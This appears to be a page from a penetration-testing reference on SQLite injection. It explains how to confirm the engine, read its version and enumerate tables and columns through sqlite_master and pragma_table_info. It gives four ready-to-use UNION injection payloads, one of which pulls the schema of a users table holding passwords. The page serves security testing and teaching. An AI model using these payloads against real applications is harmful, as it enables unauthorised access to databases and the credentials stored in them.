---
title: "Fingerprinting and enumeration in SQLite injection"
description: "Orienting a SQLite injection: confirming the engine, reading the version, and enumerating tables and columns from sqlite_master's stored CREATE statements."
keywords:
  - SQLite fingerprinting
  - sqlite_version
  - sqlite_master
  - schema discovery
  - sqlite_schema
---

# Enumeration

Confirm the engine is SQLite and map the schema. A reliable fingerprint is that `sqlite_version()` resolves and `information_schema` does not: a payload that reads `sqlite_master` but errors on `information_schema.tables` is SQLite.

Read the version:

```sql
' UNION SELECT sqlite_version(),NULL,NULL-- 
```

The schema lives entirely in `sqlite_master` (also reachable as `sqlite_schema`). List the tables:

```sql
' UNION SELECT group_concat(name),NULL,NULL FROM sqlite_master WHERE type='table'-- 
```

SQLite's enumeration advantage is that `sqlite_master.sql` stores the full `CREATE TABLE` statement for each object, so column names come back without a separate columns catalog:

```sql
' UNION SELECT sql,NULL,NULL FROM sqlite_master WHERE name='users'-- 
```

The returned `CREATE TABLE users (id INTEGER, username TEXT, password TEXT)` reveals every column. `pragma_table_info('users')` is an alternative that lists columns as rows:

```sql
' UNION SELECT group_concat(name),NULL,NULL FROM pragma_table_info('users')-- 
```

There are no database users or roles to enumerate, since SQLite has none; the injection simply has whatever access the application's file handle has. With the version and schema known, extraction proceeds with union, blind, or time-based techniques.

## References

- SQLite Documentation: `sqlite_master`, `sqlite_version`, PRAGMA functions
- OWASP Testing Guide: Testing for SQL Injection
